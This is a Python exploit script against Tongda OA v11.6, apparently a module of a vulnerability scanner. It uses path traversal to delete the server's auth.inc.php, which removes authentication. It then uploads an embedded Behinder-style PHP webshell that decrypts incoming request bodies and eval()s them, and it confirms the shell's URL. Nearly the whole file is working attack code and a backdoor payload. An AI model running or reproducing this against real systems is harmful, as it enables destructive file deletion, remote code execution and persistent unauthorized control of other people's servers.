import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging

payload = '''<?php
@error_reporting(0);
session_start();
    $key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
	$_SESSION['k']=$key;
	session_write_close();
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");

		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
?>'''

def 通达OA_v11_6_任意文件删除_RCE(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        }
    deleter_url=urldata+"module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php"
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(deleter_url, headers=headers,verify=False)
        response = requests.get(url=urldata+'inc/auth.inc.php', headers=headers,verify=False)
        if 'No input file specified.' not in response.text:
            print(Vcolors.WARNING + "[x] 删除auth.inc.php失败" +Vcolors.ENDC)
        else:
            print(Vcolors.RED + "[+] 删除auth.inc.php成果，正在上传" + Vcolors.ENDC)
            exp_url=urldata+"/general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.<>./.<>./.<>./"
            files={'FILE1': ('index123.php', payload)}
            requests.post(exp_url,files=files,verify=False)
            shell_url=urldata+'_index123.php'
            shell=requests.get(url=shell_url).text
            if 'No input file specified.' not in shell:
                print(Vcolors.RED+ "[+] 上传webshell成功,冰蝎默认密码:{}".format(shell_url) +Vcolors.ENDC)
            else:
                print(Vcolors.WARNING + "[x] 上传文件失败，可能漏洞利用失败" + Vcolors.ENDC)
    except:
        logging.error("通达OA_v11_6_任意文件删除_RCE脚本出现异常")

